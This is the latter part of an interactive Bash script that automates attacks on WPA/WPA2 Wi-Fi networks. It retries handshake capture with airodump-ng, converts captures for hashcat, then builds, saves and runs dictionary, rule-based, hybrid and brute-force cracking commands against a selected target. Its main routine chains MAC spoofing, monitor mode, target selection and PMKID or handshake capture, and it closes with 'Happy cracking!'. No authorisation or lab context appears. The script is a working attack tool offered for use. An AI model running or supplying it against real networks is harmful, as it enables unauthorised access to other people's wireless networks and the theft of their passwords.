        local result=$?

        if [ $result -eq 0 ]; then
            # Success!
            return 0
        else
            # Failed - ask to retry
            if [ $attempt -lt $max_attempts ]; then
                echo ""
                echo -e "${YELLOW}[!] Handshake not captured yet${NC}"
                read -p "Retry capture? (y/n) [y]: " retry_choice
                retry_choice=${retry_choice:-y}

                if [[ ! "$retry_choice" =~ ^[Yy]$ ]]; then
                    echo -e "${BLUE}[*] Stopping capture attempts${NC}"
                    break
                fi

                echo -e "${BLUE}[*] Restarting capture in 5 seconds...${NC}"
                sleep 5

                # Restart airodump
                if [ ! -z "$AIRODUMP_PID" ]; then
                    kill $AIRODUMP_PID 2>/dev/null || true
                fi

                airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $CAPTURE_FILE $MONITOR_INTERFACE > /dev/null 2>&1 &
                AIRODUMP_PID=$!

                ((attempt++))
            else
                echo -e "${RED}[-] Maximum attempts reached${NC}"
                break
            fi
        fi
    done

    return 1
}

# Build hashcat command with wordlist selection
build_hashcat_command() {
    local hc_file=$1

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              Hashcat Command Builder                         ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Common wordlist locations - search dynamically
    echo -e "${YELLOW}Searching for wordlists...${NC}"

    local wordlist_dirs=(
        "/usr/share/wordlists"
        "/usr/share/seclists/Passwords"
        "/usr/share/seclists/Passwords/Common-Credentials"
        "/usr/share/seclists/Passwords/Leaked-Databases"
        "$(pwd)"
    )

    local found_lists=()
    local index=1

    # Search for .txt and .txt.gz files in common directories
    for dir in "${wordlist_dirs[@]}"; do
        if [ -d "$dir" ]; then
            # Find all .txt and .txt.gz files, but limit to reasonable depth
            while IFS= read -r -d '' file; do
                # Skip very small files (< 1KB) as they're likely not real wordlists
                if [ -f "$file" ] && [ $(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null) -gt 1024 ]; then
                    found_lists+=("$file")
                    # Truncate path if too long for display
                    local display_path="$file"
                    if [ ${#display_path} -gt 60 ]; then
                        display_path="...${display_path: -57}"
                    fi
                    echo -e "  ${GREEN}[$index]${NC} $display_path"
                    ((index++))
                fi
            done < <(find "$dir" -maxdepth 3 -type f \( -name "*.txt" -o -name "*.txt.gz" \) -print0 2>/dev/null | head -z -n 20)
        fi
    done

    if [ ${#found_lists[@]} -eq 0 ]; then
        echo -e "  ${YELLOW}No wordlists found${NC}"
        echo -e "  ${YELLOW}You can download rockyou.txt with:${NC}"
        echo -e "  ${CYAN}wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt${NC}"
    fi

    echo -e "  ${GREEN}[$index]${NC} Custom path (enter manually)"
    echo ""

    read -p "Select wordlist number or 'c' for custom path [1]: " wl_choice
    wl_choice=${wl_choice:-1}

    local wordlist=""

    # Check if user wants custom path
    if [[ "$wl_choice" =~ ^[cC]$ ]] || [[ "$wl_choice" =~ ^[0-9]+$ ]] && [ "$wl_choice" -eq "$index" ] 2>/dev/null; then
        # Custom path
        while true; do
            read -p "Enter full path to wordlist: " wordlist

            # Expand tilde and clean path
            wordlist="${wordlist/#\~/$HOME}"
            wordlist=$(eval echo "$wordlist")

            if [ -f "$wordlist" ]; then
                echo -e "${GREEN}[+] Wordlist found: $wordlist${NC}"
                break
            else
                echo -e "${RED}[-] File not found: $wordlist${NC}"
                read -p "Try again? (y/n) [y]: " retry
                retry=${retry:-y}
                if [[ ! "$retry" =~ ^[Yy]$ ]]; then
                    echo -e "${YELLOW}[*] You can download rockyou.txt with:${NC}"
                    echo -e "${CYAN}  wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt${NC}"
                    return 1
                fi
            fi
        done
    elif [[ "$wl_choice" =~ ^[0-9]+$ ]] && [ "$wl_choice" -le ${#found_lists[@]} ] 2>/dev/null && [ "$wl_choice" -gt 0 ] 2>/dev/null; then
        # Valid selection from found lists
        wordlist="${found_lists[$((wl_choice-1))]}"
        echo -e "${GREEN}[+] Selected: $wordlist${NC}"

        # Check if gzipped
        if [[ "$wordlist" == *.gz ]]; then
            echo -e "${YELLOW}[*] Note: This is a gzipped file. Extracting...${NC}"
            gunzip -k "$wordlist" 2>/dev/null || true
            wordlist="${wordlist%.gz}"
        fi
    else
        # Invalid input
        echo -e "${RED}[-] Invalid selection${NC}"
        echo -e "${YELLOW}[*] Please select a number between 1 and $index, or 'c' for custom${NC}"
        return 1
    fi

    # Final verification
    if [ ! -f "$wordlist" ]; then
        echo -e "${RED}[-] Wordlist not found: $wordlist${NC}"
        echo -e "${YELLOW}[*] You can download rockyou.txt with:${NC}"
        echo -e "${CYAN}  wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt${NC}"
        return 1
    fi

    echo ""
    echo -e "${GREEN}[+] Wordlist selected: $wordlist${NC}"

    # Attack mode selection
    echo ""
    echo -e "${CYAN}Attack modes:${NC}"
    echo -e "  ${GREEN}[1]${NC} Wordlist attack (dictionary)"
    echo -e "  ${GREEN}[2]${NC} Wordlist + rules (optimized)"
    echo -e "  ${GREEN}[3]${NC} Hybrid (wordlist + 2 digits)"
    echo -e "  ${GREEN}[4]${NC} Brute force (8 digits)"
    echo -e "  ${GREEN}[5]${NC} Brute force (8 characters, alphanumeric)"
    echo ""

    read -p "Select attack mode [1]: " attack_mode
    attack_mode=${attack_mode:-1}

    # Build hashcat command based on mode
    local hashcat_cmd=""
    local description=""

    # Properly quote paths for command building
    local quoted_hc_file="\"$hc_file\""
    local quoted_wordlist="\"$wordlist\""

    case $attack_mode in
        1)
            hashcat_cmd="hashcat -m 22000 $quoted_hc_file $quoted_wordlist"
            description="Straight wordlist attack"
            ;;
        2)
            hashcat_cmd="hashcat -m 22000 $quoted_hc_file $quoted_wordlist -r /usr/share/hashcat/rules/best64.rule"
            description="Wordlist with best64 rules"
            ;;
        3)
            hashcat_cmd="hashcat -m 22000 $quoted_hc_file -a 6 $quoted_wordlist ?d?d"
            description="Hybrid: wordlist + 2 digits"
            ;;
        4)
            hashcat_cmd="hashcat -m 22000 $quoted_hc_file -a 3 ?d?d?d?d?d?d?d?d"
            description="Brute force: 8 digits"
            ;;
        5)
            hashcat_cmd="hashcat -m 22000 $quoted_hc_file -a 3 ?a?a?a?a?a?a?a?a"
            description="Brute force: 8 alphanumeric"
            ;;
        *)
            hashcat_cmd="hashcat -m 22000 $quoted_hc_file $quoted_wordlist"
            description="Straight wordlist attack"
            ;;
    esac

    # Additional options
    echo ""
    echo -e "${CYAN}Additional options:${NC}"
    echo -e "  ${GREEN}[1]${NC} Basic (default)"
    echo -e "  ${GREEN}[2]${NC} Optimized (-O, faster but limited passwords)"
    echo -e "  ${GREEN}[3]${NC} Workload profile 3 (-w 3, high performance)"
    echo -e "  ${GREEN}[4]${NC} Both optimized + high workload (-O -w 3)"
    echo ""

    read -p "Select options [1]: " opts_choice
    opts_choice=${opts_choice:-1}

    case $opts_choice in
        2)
            hashcat_cmd="$hashcat_cmd -O"
            ;;
        3)
            hashcat_cmd="$hashcat_cmd -w 3"
            ;;
        4)
            hashcat_cmd="$hashcat_cmd -O -w 3"
            ;;
    esac

    # Display final command
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                  Generated Hashcat Command                   ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Description:${NC} $description"
    echo ""
    echo -e "${CYAN}Command:${NC}"
    echo -e "${BOLD}$hashcat_cmd${NC}"
    echo ""

    # Save to file
    local cmd_file="hashcat_command.txt"
    echo "$hashcat_cmd" > "$cmd_file"
    echo -e "${GREEN}[+] Command saved to: $cmd_file${NC}"

    # Create a convenient script
    local script_file="run_hashcat.sh"
    cat > "$script_file" << EOF
#!/bin/bash
# Auto-generated hashcat script
# Target: $TARGET_ESSID

echo "Starting hashcat attack on $TARGET_ESSID..."
echo "Command: $hashcat_cmd"
echo ""

$hashcat_cmd

echo ""
echo "Attack complete! To see cracked password:"
echo "  hashcat -m 22000 $hc_file --show"
EOF
    chmod +x "$script_file"
    echo -e "${GREEN}[+] Executable script created: $script_file${NC}"

    # Ask to run now
    echo ""
    read -p "Run hashcat now? (y/n) [n]: " run_now

    if [[ "$run_now" =~ ^[Yy]$ ]]; then
        # Check if hashcat is installed
        if ! command -v hashcat &> /dev/null; then
            echo ""
            echo -e "${RED}[-] hashcat not found!${NC}"
            echo -e "${YELLOW}[*] Install with: sudo apt install hashcat${NC}"
            echo -e "${YELLOW}[*] Or download from: https://hashcat.net/hashcat/${NC}"
            echo ""
            echo -e "${BLUE}[*] Command saved to: $script_file${NC}"
            echo -e "${BLUE}[*] Run it after installing hashcat${NC}"
            return 1
        fi

        echo ""
        echo -e "${GREEN}[+] Starting hashcat...${NC}"
        echo -e "${YELLOW}[*] Press 'q' to quit, 's' for status during cracking${NC}"
        echo ""

        # Show the actual command being run
        show_command "$hashcat_cmd"
        sleep 2

        # Execute hashcat
        if eval "$hashcat_cmd"; then
            echo ""
            echo -e "${GREEN}[+] Hashcat finished successfully!${NC}"
            echo ""
            echo -e "${CYAN}To see if password was cracked:${NC}"
            echo -e "  hashcat -m 22000 \"$hc_file\" --show"
            echo ""

            # Try to show results immediately
            local cracked=$(hashcat -m 22000 "$hc_file" --show 2>/dev/null)
            if [ ! -z "$cracked" ]; then
                echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
                echo -e "${GREEN}${BOLD}║                  🎉 PASSWORD CRACKED! 🎉                     ║${NC}"
                echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
                echo ""
                echo -e "${GREEN}Result:${NC}"
                echo "$cracked"
                echo ""
            else
                echo -e "${YELLOW}[*] No password cracked yet. Try a different wordlist or attack mode.${NC}"
            fi
        else
            echo ""
            echo -e "${RED}[-] Hashcat failed or was interrupted${NC}"
            echo -e "${YELLOW}[*] Check the error message above${NC}"
            echo ""
            echo -e "${CYAN}To retry manually:${NC}"
            echo -e "  $hashcat_cmd"
        fi
    else
        echo ""
        echo -e "${YELLOW}[*] To run later:${NC}"
        echo -e "${CYAN}  ./$script_file${NC}"
        echo -e "${CYAN}  OR${NC}"
        echo -e "${CYAN}  $hashcat_cmd${NC}"
    fi
}

# Process captured handshake
process_handshake() {
    local capfile="${CAPTURE_FILE}-01.cap"

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              Processing Captured Handshake                   ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Verify handshake
    echo -e "${BLUE}[*] Verifying handshake...${NC}"
    show_command "aircrack-ng \"$capfile\""
    aircrack-ng "$capfile" 2>/dev/null | grep --color=never "WPA\|handshake"

    echo ""
    echo -e "${GREEN}[+] Handshake verified!${NC}"

    # Convert to hashcat format
    echo ""
    read -p "Convert to hashcat format? (y/n) [y]: " convert_choice
    convert_choice=${convert_choice:-y}

    if [[ "$convert_choice" =~ ^[Yy]$ ]]; then
        local hc_file="${CAPTURE_FILE}.hc22000"

        if command -v hcxpcapngtool &> /dev/null; then
            echo -e "${BLUE}[*] Converting with hcxpcapngtool...${NC}"
            show_command "hcxpcapngtool -o \"$hc_file\" \"$capfile\""
            hcxpcapngtool -o "$hc_file" "$capfile" 2>/dev/null
            echo -e "${GREEN}[+] Converted: $hc_file${NC}"

            # Build hashcat command
            build_hashcat_command "$hc_file"
        else
            echo -e "${YELLOW}[!] hcxpcapngtool not found${NC}"
            echo -e "${BLUE}[*] Install with: sudo apt install hcxtools${NC}"
            echo ""
            echo -e "${YELLOW}Alternative: Upload to https://hashcat.net/cap2hashcat/${NC}"
        fi
    fi

    # Show file location
    echo ""
    echo -e "${GREEN}╔═══════════════════ Files Created ══════════════════════╗${NC}"
    echo -e "${GREEN}║${NC} Capture file : ${YELLOW}$(pwd)/${capfile}${NC}"
    if [ -f "${CAPTURE_FILE}.hc22000" ]; then
        echo -e "${GREEN}║${NC} Hashcat file : ${YELLOW}$(pwd)/${CAPTURE_FILE}.hc22000${NC}"
    fi
    echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
}

# Main function
main() {
    show_banner
    check_root
    check_dependencies

    # Get interface
    get_interface

    # MAC spoofing
    spoof_mac

    # Enable monitor mode
    enable_monitor_mode

    # Scan for APs
    scan_aps

    # Display APs
    display_aps

    # Select target
    select_target

    # Ask for capture mode (PMKID or Handshake)
    ask_capture_mode

    # Start capture based on mode
    if [ "$CAPTURE_MODE" = "pmkid" ]; then
        capture_pmkid
        local pmkid_result=$?

        # If PMKID failed, offer to try handshake
        if [ $pmkid_result -ne 0 ]; then
            echo ""
            read -p "Try handshake capture instead? (y/n) [y]: " try_handshake
            try_handshake=${try_handshake:-y}

            if [[ "$try_handshake" =~ ^[Yy]$ ]]; then
                CAPTURE_MODE="handshake"
                ask_attack_mode
                start_capture
                process_handshake
            fi
        fi
    else
        # Handshake mode
        start_capture
        process_handshake
    fi

    echo ""
    echo -e "${GREEN}${BOLD}[+] All done! Happy cracking! 🔓${NC}"
    echo ""

    # Manual cleanup at the end
    cleanup
}

# Run main
main
